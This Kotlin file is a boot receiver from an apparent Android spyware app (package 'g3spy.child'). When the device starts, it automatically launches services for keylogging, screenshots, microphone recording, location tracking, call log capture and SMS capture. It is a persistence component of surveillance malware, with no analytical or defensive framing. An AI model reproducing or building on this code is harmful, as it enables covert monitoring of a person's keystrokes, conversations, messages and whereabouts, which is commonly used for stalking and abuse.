package com.g3spy.child.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.g3spy.child.KeyloggingService
import com.g3spy.child.MicRecordingService
import com.g3spy.child.ScreenshotService
import com.g3spy.child.services.CallLogService
import com.g3spy.child.services.LocationService
import com.g3spy.child.services.SmsService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Start all services when device boots
            context.startService(Intent(context, KeyloggingService::class.java))
            context.startService(Intent(context, ScreenshotService::class.java))
            context.startService(Intent(context, MicRecordingService::class.java))
            context.startService(Intent(context, com.g3spy.child.services.LocationService::class.java))
            context.startService(Intent(context, com.g3spy.child.services.CallLogService::class.java))
            context.startService(Intent(context, com.g3spy.child.services.SmsService::class.java))
        }
    }
}